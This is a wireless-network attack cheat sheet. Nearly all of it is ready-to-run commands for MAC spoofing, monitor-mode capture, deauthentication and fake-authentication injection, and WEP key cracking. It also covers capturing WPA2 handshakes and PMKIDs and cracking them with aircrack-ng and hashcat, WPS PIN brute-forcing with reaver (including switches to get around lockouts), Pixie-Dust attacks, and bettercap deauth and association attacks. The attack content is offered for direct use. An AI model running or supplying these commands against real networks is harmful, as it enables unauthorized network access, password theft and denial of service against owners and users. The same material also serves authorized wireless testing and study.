# WIFI CRACKING

## General Informations 
```
# Bypass MAC filter
macchanger –m B0:D0:9C:5C:EF:86 wlan0

## Monitoring, Recon and Dumping 

# Using the aircrack-ng suite
# Turning on the monitor mode
sudo airmon-ng start wlan0mon

# Simple passive listening and capture
# Used to discover AP in the environment
sudo airodump-ng wlan0mon

# Targetted listening and capture
# Focus on one AP and one channel
sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile
```

## Attacking WEP 
```
# WEP is an old encryption protocol but still used in some places
# It is vulnerable to direct cracking attacks

# The only requirement is to get enough IV
# The process can be enhanced by sending deauth packets
# -0 == detauth attack, sending 3 packets (can be increased)
aireplay-ng -0 3 -a <TARGET_AP_MAC> wlan0mon -w 

# Another possibility is to use fake authentication to generate IV
# -1 = fake authentication
# 0 = delay between association demands
# -e = AP ESSID (name)
# -a = AP MAC
# -h = attacker MAC
aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

# ARP Sniffing and injection is another method
aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

# Using aircrack-ng it is possible to directly crack the WEP Key
aircrack-ng outfile -w wordlist
```

## Attacking WPA2 PSK (The old way) 
```
# Using the aircrack-ng suite
# You can first focus one AP using airodump-ng (see monitoring section)
# Here, you want to get the 4-way WPA Handshake
# It requires network traffic between the AP and one device

# Dumping
sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile

# Deauth connected devices to initiate authentication process and try to get the handshake
aireplay-ng --deauth 15 -a <TARGET_AP_MAC> wlan0mon
aireplay-ng -0 15 -a <TARGET_AP_MAC> wlan0mon 

# In the airodump-ng console, the WPA handshake will appear once captured

# Cracking can be done using aircrack-ng
aircrack-ng outfile -w wordlist

# But also using other tools like hashcat
# The outfile needs to be an HCCAPX file
# Hashcat utils provide a binary to convert
.\cap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx

# Then you can crack it like a normal hash (see hashcat section)
.\hashcat64.exe -m 2500 WPA2_test.hccapx wordlist.txt --force -O
```

## Attacking WPA2 using PMKID 
```
# You don't need any network traffic
# Using hcxtools and hcxdumptool

# Monitor mode
sudo airmon-ng start wlan0mon

# PMKID capture
# It can take a while to capture PKMID (several minutes++)
# If an AP recieves our association request packet and supports sending 
sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1

# Then convert the captured data to a suitable format for hashcat
# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
# -I retrieve identities from WiFi-traffic
# -U retrieve usernames from WiFi-traffic
sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

# Then, you can use hashcat to crack it (see hashcat section)
./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
```

## Attacking WPS (WiFi Protected Setup) 
```
# Reaver Attack
# Online bruteforcing of the WPS 8-digits PIN
# Kinda old and can be obsolete nowadays, but still usable

# Reaver integrated dumping tool (can also airodump-ng)
# Wash gives information about WPS being locked or not
# Locked WPS will have less success chances
wash -i wlan0mon

# Launching reaver
reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv

# Some manufacturers have implemented protections
# You can try different switches to bypass
# -L = Ignore locked state
# -N = Don't send NACK packets when errors are detected
# -d = delay X seconds between PIN attempts
# -T = set timeout period to X second (.5 means half second)
# -r = After X attemps, sleep for Y seconds
reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15

# Pixie-Dust Attack
# Done with Reaver + PixieWPS
# This attack is based on seed / false random

# Start reaver, we need the PKE, PKR, e-hash 1 & e-hash 2, E-nonce / R-nonce 
# and the authkey from Reaver to use for pixiewps
reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv -S

# Now using pixiexps, you can crack PIN offline
pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>

# Then, you can use the PIN with reaver to get to cleartext password
reaver -i <monitor interface> -b <bssid> -c <channel>  -p <PIN>
```

## Bettercap Pwning (https://www.bettercap.org/modules/) 
```
# Deauth and 4-way handshake attack
sudo bettercap -iface wlan0

# Start the monitoring mode
> wifi.recon on

# Set the AP sorting by clients number
> set wifi.show.sort clients desc

# Every 1 sec, clear view and display an updated one
> set ticker.commands 'clear; wifi.show'
> ticker on

# Set the target channel
> wifi.recon.channel 1

# Initiate deauth packets
> wifi.deauth e0:xx:xx:xx:xx:xx

# Convert
/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx

# Cracking
/path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
```
```
# Client-less PMKID Attack
# PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
sudo bettercap -iface wlan0

# Start the monitoring mode
> wifi.recon on

# As long as the PMK is constant, we just need to get one to initiate attack
# Instead of deauth others, we will associate to the AP and listen which one
# Send good informations
# wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
> wifi.assoc all

# Convert
/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap

# Cracking
/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```